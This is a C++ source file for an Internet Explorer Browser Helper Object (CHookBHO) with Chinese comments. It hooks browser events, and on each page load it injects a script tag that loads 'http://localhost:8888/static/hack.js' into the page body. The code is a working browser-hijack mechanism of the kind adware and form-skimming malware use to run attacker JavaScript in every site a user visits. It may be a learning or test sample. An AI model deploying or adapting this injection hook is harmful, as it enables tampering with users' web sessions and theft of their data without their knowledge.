// HookBHO.cpp : Implementation of CHookBHO

#include "stdafx.h"
#include "HookBHO.h"


// CHookBHO

STDMETHODIMP CHookBHO::SetSite(IUnknown* pUnkSite)
{
	if (pUnkSite != NULL)//打开窗口时调用
	{
		HRESULT hr;
		CComPtr<IServiceProvider> sp;

		hr = pUnkSite->QueryInterface(&sp);
		if (SUCCEEDED(hr) && sp)
		{
			//缓存指向IWebBrowser2的指针
			hr = sp->QueryService(IID_IWebBrowserApp, IID_IWebBrowser2, (void**)&m_spWebBrowser);

			if (SUCCEEDED(hr) && m_spWebBrowser)
			{
				//注册DWebBrowserEvents2事件。
				hr = DispEventAdvise(m_spWebBrowser);
				if (SUCCEEDED(hr))
				{
					m_fAdvised = TRUE;
				}
			}
		}
		m_spUnkSite = pUnkSite;
	}
	else//浏览器退出时调用
	{
		//取消注册事件。
		if (m_fAdvised)
		{
			DispEventUnadvise(m_spWebBrowser);
			m_fAdvised = FALSE;
		}
		//在此释放缓存的指针和其他资源。
		m_spWebBrowser.Release();
	}
	//调用基类实现。
	return IObjectWithSiteImpl<CHookBHO>::SetSite(pUnkSite);
}

//文档装载完成，刷新不会触发
void STDMETHODCALLTYPE CHookBHO::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL)
{	
	BSTR url = pvarURL->bstrVal;
	CComBSTR u(url);
	MessageBox(0, u, L"the url is", MB_OK);
	HRESULT hr = S_OK;
	// 查询 IWebBrowser2 接口。   
	CComQIPtr<IWebBrowser2> spTempWebBrowser = pDisp;
	
	// 
	if (spTempWebBrowser && m_spWebBrowser && m_spWebBrowser.IsEqualObject(spTempWebBrowser))
	{
		
	}
}

void STDMETHODCALLTYPE CHookBHO::OnDownloadComplete(IDispatch *pDisp, VARIANT *pvarURL)
{   
	CComBSTR url;
	HRESULT hr = m_spWebBrowser->get_LocationURL(&url);
	if (url && url.Length() > 15)//过滤掉about：tab等
	{
		//MessageBox(0, url, L"current url is", MB_OK); 
		CComPtr<IDispatch>  spDispDoc;
		hr = m_spWebBrowser->get_Document(&spDispDoc); 
		if (SUCCEEDED(hr))
		{
			VARIANT sid;
			sid.vt = VT_BSTR;
			sid.bstrVal = SysAllocString(L"xiyiaoo_script_hook");
			CComQIPtr<IHTMLDocument3> doc3(spDispDoc);
			IHTMLElement *scriptElement = NULL;
			if (doc3)
			{
				doc3->getElementById(sid.bstrVal, &scriptElement);
				if (!scriptElement)//是否已经插入过js
				{  
					CComQIPtr<IHTMLDocument2> doc(spDispDoc);
					if (doc)
					{
						BSTR eTag = SysAllocString(L"SCRIPT");
						hr = doc->createElement(eTag, &scriptElement);
						if (SUCCEEDED(hr))
						{
							IHTMLDOMNode *scriptNode = NULL;
							hr = scriptElement->QueryInterface(IID_IHTMLDOMNode, (void **)&scriptNode);
							if (SUCCEEDED(hr))
							{
								scriptElement->setAttribute(L"id", sid);
								VARIANT style;
								style.vt = VT_BSTR;
								style.bstrVal = SysAllocString(L"text/javascript");
								scriptElement->setAttribute(L"type", style, 1);
								VARIANT url;
								url.vt = VT_BSTR;
								url.bstrVal = SysAllocString(L"http://localhost:8888/static/hack.js");
								scriptElement->setAttribute(L"src", url, 1);
								VARIANT charset;
								charset.vt = VT_BSTR;
								charset.bstrVal = SysAllocString(L"utf-8");
								scriptElement->setAttribute(L"charset", charset, 1);
								CComQIPtr<IHTMLElement> bodyElement;
								CComQIPtr<IHTMLDOMNode> bodyNode;
								hr = doc->get_body(&bodyElement);
								if (SUCCEEDED(hr))
								{
									hr = bodyElement->QueryInterface(IID_IHTMLDOMNode, (void**)&bodyNode);
									if (SUCCEEDED(hr))
									{
										bodyNode->appendChild(scriptNode, &scriptNode);//插入js
									}
								}					
							}
						}
					}
				}
			}
		}
	}
}